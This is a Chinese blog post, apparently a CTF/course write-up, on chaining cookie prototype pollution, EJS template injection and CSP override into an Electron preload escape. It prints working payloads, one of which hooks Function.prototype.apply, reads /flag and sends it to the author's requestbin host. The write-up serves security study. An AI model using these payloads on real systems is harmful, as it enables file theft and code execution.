@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="pollution here, pollution there, pollution everywhere高级网络攻防课上的一个题，一个原型链污染打electron的题。龚老师要求写报告，就把报告改一下当篇wp记一下。rmb说准备当升级赛题后来又换掉了，太顶级了，完全不会electron，头都被打歪了 但是这门课上起来及其坐牢，每个人都要做web，pwn，re三个方向，会一个方向的就已经非常坐牢了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pollution here, pollution there, pollution everywhere">
+<meta property="og:url" content="https://blog.z3ratu1.cn/pollution.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="pollution here, pollution there, pollution everywhere高级网络攻防课上的一个题，一个原型链污染打electron的题。龚老师要求写报告，就把报告改一下当篇wp记一下。rmb说准备当升级赛题后来又换掉了，太顶级了，完全不会electron，头都被打歪了 但是这门课上起来及其坐牢，每个人都要做web，pwn，re三个方向，会一个方向的就已经非常坐牢了">
+<meta property="og:locale">
+<meta property="og:image" content="https://image-host-1304136909.cos.ap-shanghai.myqcloud.com/blog/%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%A5%E5%91%8A/image-20230401135431071.png">
+<meta property="og:image" content="https://image-host-1304136909.cos.ap-shanghai.myqcloud.com/blog/%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%A5%E5%91%8A/image-20230401135408945.png">
+<meta property="og:image" content="https://image-host-1304136909.cos.ap-shanghai.myqcloud.com/blog/%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%A5%E5%91%8A/image-20230401140106099.png">
+<meta property="og:image" content="https://image-host-1304136909.cos.ap-shanghai.myqcloud.com/blog/pollution/image-20230402102519340.png">
+<meta property="og:image" content="https://image-host-1304136909.cos.ap-shanghai.myqcloud.com/blog/pollution/image-20230402102753140.png">
+<meta property="og:image" content="https://image-host-1304136909.cos.ap-shanghai.myqcloud.com/blog/pollution/image-20230402103012977.png">
+<meta property="og:image" content="https://image-host-1304136909.cos.ap-shanghai.myqcloud.com/blog/pollution/image-20230401164639720.png">
+<meta property="article:published_time" content="2023-04-01T07:26:41.000Z">
+<meta property="article:modified_time" content="2023-04-04T08:49:43.889Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="原型链污染">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image-host-1304136909.cos.ap-shanghai.myqcloud.com/blog/%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%A5%E5%91%8A/image-20230401135431071.png">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/pollution.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>pollution here, pollution there, pollution everywhere | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/pollution.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pollution here, pollution there, pollution everywhere
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-04-01 15:26:41" itemprop="dateCreated datePublished" datetime="2023-04-01T15:26:41+08:00">2023-04-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-04 16:49:43" itemprop="dateModified" datetime="2023-04-04T16:49:43+08:00">2023-04-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/pollution.html" class="post-meta-item leancloud_visitors" data-flag-title="pollution here, pollution there, pollution everywhere" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/pollution.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/pollution.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="pollution-here-pollution-there-pollution-everywhere"><a href="#pollution-here-pollution-there-pollution-everywhere" class="headerlink" title="pollution here, pollution there, pollution everywhere"></a>pollution here, pollution there, pollution everywhere</h1><p>高级网络攻防课上的一个题，一个原型链污染打electron的题。龚老师要求写报告，就把报告改一下当篇wp记一下。rmb说准备当升级赛题后来又换掉了，太顶级了，完全不会electron，头都被打歪了</p>
+<p>但是这门课上起来及其坐牢，每个人都要做web，pwn，re三个方向，会一个方向的就已经非常坐牢了，一个方向都不会的顶级坐牢。最重要的是上课讲的技术就是两句话的介绍，然后实验环节做中等偏低难度的题（这个题顶级难度），跨方向做题无比坐牢。总而言之，这个课上学的东西都不是教的，是给你布置一个奇奇怪怪的题然后自己硬学坐牢学会的。。。<br><strong>得出结论：不要选这门课！！！不要选这门课！！！不要选这门课！！！</strong></p>
+<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>题目分为两部分，server端和bot端，flag放在bot端，可以让bot访问server的页面，bot是用electron写的，看起来就是electron的xss2rce，但是完全不会electron，学了半天也不是很会</p>
+<h3 id="cookie原型链污染"><a href="#cookie原型链污染" class="headerlink" title="cookie原型链污染"></a>cookie原型链污染</h3><p>server端的功能写了一大堆，能用的就这个原型链污染，加上另一个渲染ejs模板</p>
+<pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> userSetting <span class="token operator">=</span> <span class="token function">mergeObject</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">,</span> <span class="token function">mergeObject</span><span class="token punctuation">(</span>defaultSetting<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>可以使用cookie进行原型链污染，但是正常情况下cookie是不能传递对象的，然后翻cookie.parser文档发现支持特殊语法的”json cookie”:<code>&lt;key&gt;=j:&lt;json_value&gt;</code></p>
+<p>直接<code>a=j:&#123;&quot;b&quot;:&#123;&quot;__proto__&quot;:&quot;xxxx&quot;&#125;&#125;</code>为所欲为</p>
+<h3 id="ejs原型链污染RCE"><a href="#ejs原型链污染RCE" class="headerlink" title="ejs原型链污染RCE"></a>ejs原型链污染RCE</h3><p>实现原型链污染后，此处在express运行时进行了chroot，导致没有可用的二进制文件，没法执行命令，只能执行一些js的代码，由于最后肯定是要打bot，所以先弄一个xss出来</p>
+<p>实际上ejs的渲染过程是将原模板和一些参数选项拼接上去形成一个函数，最后调用这个函数完成渲染内容，而ejs中原型链污染导致的rce实际上就是在拼接的函数中插入自己的恶意代码，比如此处的escapeFn，所以直接return一个字符串就能实现对模板的完全控制</p>
+<p><img src="https://image-host-1304136909.cos.ap-shanghai.myqcloud.com/blog/%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%A5%E5%91%8A/image-20230401135431071.png" alt="image-20230401135431071"></p>
+<p><img src="https://image-host-1304136909.cos.ap-shanghai.myqcloud.com/blog/%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%A5%E5%91%8A/image-20230401135408945.png" alt="image-20230401135408945"></p>
+<p>实际上这个也是没多久前遇到的考点，hxpCTF2022的valentine就是这个东西。。。</p>
+<h3 id="CSP控制"><a href="#CSP控制" class="headerlink" title="CSP控制"></a>CSP控制</h3><p>控制了模板之后还需要控制CSP，本题设置了较为严格的CSP，起码想随便执行js是不太可能的，需要想办法给他盖掉。这里观察到原型链污染的值会出现在http response header中，大概就能猜出来原型链污染会有所影响，直接猜一个原型链污染一份CSP改成小写的数据上去，然后的确直接覆盖掉原本的csp了</p>
+<p>调试一下，发现在setHeader方法中，其将http header先转为小写再进行赋值，此处默认的CSP全称为<code>Content-Security-Policy</code>，通过传一个全小写的<code>content-security-policy</code>上去，转为小写后覆盖原csp<br>对header对象的遍历赋值好像是for in，这样子会导致遍历到被污染的值</p>
+<p><img src="https://image-host-1304136909.cos.ap-shanghai.myqcloud.com/blog/%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%A5%E5%91%8A/image-20230401140106099.png" alt="image-20230401140106099"></p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>这部分payload如下</p>
+<pre class=" language-js"><code class="language-js">a<span class="token operator">=</span>j<span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"a"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"__proto__"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"client"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"escape"</span><span class="token punctuation">:</span><span class="token string">"{}%3breturn \"content&lt;code id='battle_info'>&lt;/code>&lt;script src='http://www.z3ratu1.cn/poc.js'>&lt;/script>\"%3b"</span><span class="token punctuation">,</span><span class="token string">"content-security-policy"</span><span class="token punctuation">:</span><span class="token string">"default-src *%3b script-src www.z3ratu1.cn"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
+</code></pre>
+<p>直接引入远程脚本免得每次修改js需要修改前面的内容</p>
+<h3 id="electron部分"><a href="#electron部分" class="headerlink" title="electron部分"></a>electron部分</h3><p>这一步的时间得是前面几部合起来的三倍以上吧。。。完全不会electron</p>
+<p>简单的说，electron分为渲染进程和主进程，渲染进程就是我们看到的图形化界面，负责执行页面上的js之类的HTML内容，主进程有着完整的node api接触权，有创建窗口交互执行命令等一系列能力，渲染进程和主进程间是隔离的，用户可控页面的js运行在渲染进程上，再怎么打也不会直接影响到主进程</p>
+<h4 id="electron安全参数"><a href="#electron安全参数" class="headerlink" title="electron安全参数"></a>electron安全参数</h4><p>推荐阅读：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.electronjs.org/zh/docs/latest/tutorial/security">安全|Electron</a><br>这里要讲的安全相关的参数有三个<code>Node Integration</code>，<code>Context Isolation</code>和<code>sandbox</code>，开始之前可以先看一下black hat上<a target="_blank" rel="external nofollow noopener noreferrer" href="https://i.blackhat.com/USA-22/Thursday/US-22-Purani-ElectroVolt-Pwning-Popular-Desktop-Apps.pdf">究极议题</a>的几张图</p>
+<p><img src="https://image-host-1304136909.cos.ap-shanghai.myqcloud.com/blog/pollution/image-20230402102519340.png" alt="image-20230402102519340"></p>
+<p><img src="https://image-host-1304136909.cos.ap-shanghai.myqcloud.com/blog/pollution/image-20230402102753140.png" alt="image-20230402102753140"></p>
+<p><img src="https://image-host-1304136909.cos.ap-shanghai.myqcloud.com/blog/pollution/image-20230402103012977.png" alt="image-20230402103012977"></p>
+<p>图中可以看出来，<code>Node Integration</code>启用时，render进程可以直接接触到Node api，XSS就能直接访问node api，一键rce。处于安全考虑，<code>Node Integration</code>一般是关掉的，但这样子的话页面js不能访问node api，electron作为桌面应用程序很多读写文件之类的功能就没法用了（或者写ipc让主进程完成）。为此，提出了<code>preload.js</code>，其将node api中的功能部分暴露出来，并且赋值到window，global等对象上，供页面js调用，页面js就只能以规定的api形式去调用这些功能，安全性++，但这又引入了新的问题，页面js和preload.js运行在一个上下文中，虽然不能直接去拿函数里面能接触nodeapi的对象，但是可以通过原型链污染等方法去控制call,apply之类的函数，如果敏感对象成为了这些方法的调用者或者参数，就可以通过这些对象访问node api，实现rce</p>
+<p>为此，<code>Context Isolation</code>选项又被添加了上来，使用和Chrome插件相同的隔离手段，将页面js和preload.js的运行上下文隔离开来，确保了安全性</p>
+<p>本题的启动参数如下所示</p>
+<pre class=" language-js"><code class="language-js">    <span class="token keyword">const</span> window <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BrowserWindow</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+        width<span class="token punctuation">:</span> <span class="token number">800</span><span class="token punctuation">,</span>
+        height<span class="token punctuation">:</span> <span class="token number">600</span><span class="token punctuation">,</span>
+        webPreferences<span class="token punctuation">:</span> <span class="token punctuation">{</span>
+            nodeIntegration<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+            contextIsolation<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+            webviewTag<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+            devTools<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+            preload<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'preload.js'</span><span class="token punctuation">)</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span>
+</code></pre>
+<p>preload.js如下所示</p>
+<pre class=" language-js"><code class="language-js">window<span class="token punctuation">.</span>saveLog <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">let</span> path <span class="token operator">=</span> <span class="token keyword">await</span> ipcRenderer<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token string">"saveLog"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>path <span class="token operator">!==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> path <span class="token operator">===</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#battle_info"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>关了contextIsolation并且有preload.js，所以做法就是通过我们的xss做原型链污染，想办法接触到preload.js中导出的能接触node api的对象，并用那个对象做到xss2rce。感觉就挺有意思的，我能执行各种各样的代码，但是我接触不到能执行命令的模块，所以我不能rce，但是我可以通过影响程序的执行去接触到可以接触那些模块的对象，进而实现逃逸，感觉node的vm模块的逃逸好像也是这么个思路</p>
+<p>这篇文章对contextIsolation关闭下的利用手法有一个 较为详细的介绍<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en">Electron: Abusing the lack of context isolation</a></p>
+<p>主进程是不用考虑的，进程间隔离说什么也不能跨进程打过去的，除非ipc有奇怪的洞，关了<code>Context Isolation</code>也就是页面js影响一下preload.js罢了</p>
+<p>后来又主动看了一点electron的安全措施，<code>Context Isolation</code>启用之后就上下文隔离了也就不能再通过window.func这种形式去导出函数了，两边上下文不一致赋值上去也拿不到，得用专门的导出函数<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.electronjs.org/zh/docs/latest/tutorial/context-isolation">上下文隔离|Electron</a></p>
+<p><code>sandbox</code>是用于保护安全的究极手段，启用后渲染进程直接整个与node隔离，只能通过ipc让主进程进行操作，即使写preload.js能够导入的功能也受到了限制，详情还是看文档<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.electronjs.org/zh/docs/latest/tutorial/sandbox">进程沙盒化|Electron</a></p>
+<p><code>webviewTag</code>是用来禁用<code>&lt;webview&gt;</code>标签的，这个标签类似于iframe，可以开新页面，而开启新页面的时候可以自行设置自己的<code>webPreferences</code>属性的，一键绕过所有限制。不过好像需要electron自己重新定义默认的webview设置？<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.electronjs.org/docs/latest/tutorial/security#12-verify-webview-options-before-creation">verify-webview-options-before-creation</a></p>
+<h3 id="调试electron"><a href="#调试electron" class="headerlink" title="调试electron"></a>调试electron</h3><p>调主进程和渲染进程是分开的，webstorm可以通过直接添加如下一个操作调主进程（不过因为我们攻击影响不到主进程，所以调着没啥意义）</p>
+<p><img src="https://image-host-1304136909.cos.ap-shanghai.myqcloud.com/blog/pollution/image-20230401164639720.png" alt="image-20230401164639720"></p>
+<p>渲染进程的话直接在打开的electron app上调，这里rmb在主进程里加了两个buff，分别是<code>webPreferences</code>中的<code>devTools</code>和<code>window.removeMenu()</code>关闭了dev tools，分别取消掉就可以直接用dev tools调了</p>
+<pre class=" language-js"><code class="language-js">    <span class="token keyword">const</span> window <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BrowserWindow</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+        width<span class="token punctuation">:</span> <span class="token number">800</span><span class="token punctuation">,</span>
+        height<span class="token punctuation">:</span> <span class="token number">600</span><span class="token punctuation">,</span>
+        webPreferences<span class="token punctuation">:</span> <span class="token punctuation">{</span>
+            nodeIntegration<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+            contextIsolation<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+            webviewTag<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+            devTools<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
+            preload<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'preload.js'</span><span class="token punctuation">)</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span>
+    <span class="token comment" spellcheck="true">// window.removeMenu()</span>
+</code></pre>
+<p>调试的时候单步也很玄学，和webstorm有时候一样，不先去文件里面下断点进不了库函数，有时候断点步进步进就不知道跳哪去了。。。rmb说后面这个可能是因为异步执行的原因，我感觉很有道理，但前面这个问题不知道怎么解决</p>
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>一开始是直接套的那个PPT的操作，hook住call，并对所有参数进行检测，发现能拿到一个<code>__webpack_require__</code>对象，然后按照<a target="_blank" rel="external nofollow noopener noreferrer" href="https://mp.weixin.qq.com/s/E9cBVrIikwDm1X586xl-vw">Electron攻击面分析</a>这篇文章一键打通本地，然后whj和我说这个是本地开发环境下才有的东西，用<code>electron-builder --dir</code>生产环境下打包没得。。。遂放弃（然后天哥说虽然本地不通，但是远程docker里用<code>electron-builder --dir</code>打包的又有，他就是这么打通的。。。不懂electron）</p>
+<p>然后调了一个晚上没找到哪里能拿process，最后是发现fs的调用环节中hook住apply可以接触到fs对象，可以使用fs对象的readFileSync方法进行任意文件读</p>
+<p>写出如下payload</p>
+<pre class=" language-js"><code class="language-js">Function<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>originApply <span class="token operator">=</span> Function<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>apply
+
+Function<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>apply <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token operator">...</span>arg<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token keyword">this</span> <span class="token operator">===</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>arg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!==</span> undefined <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> arg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>readFileSync<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            Function<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>apply <span class="token operator">=</span> Function<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>originApply<span class="token punctuation">;</span>
+            <span class="token keyword">let</span> flag <span class="token operator">=</span> arg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+            window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"http://requestbin.z3ratu1.cn?"</span><span class="token operator">+</span>flag
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">originApply</span><span class="token punctuation">(</span><span class="token operator">...</span>arg<span class="token punctuation">)</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+window<span class="token punctuation">.</span><span class="token function">saveLog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>此处存储原apply方法再调用的操作是从<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.zhaoj.in/read-6263.html">赵今</a>那找的，不这样进行恢复的话原程序运行会出问题，然后type of function判断挺抽象的，明明我改的是function的apply，但是还是会有object调用apply然后进了报错挂了。。。不是很懂</p>
+<p>由于readFileSync中会调用apply，如果不做修改会导致循环递归爆栈。一开始是声明了一个全局变量，后来看到black hat那个议题里面找到对应类后复原的操作很不错，就改成这个样子。</p>
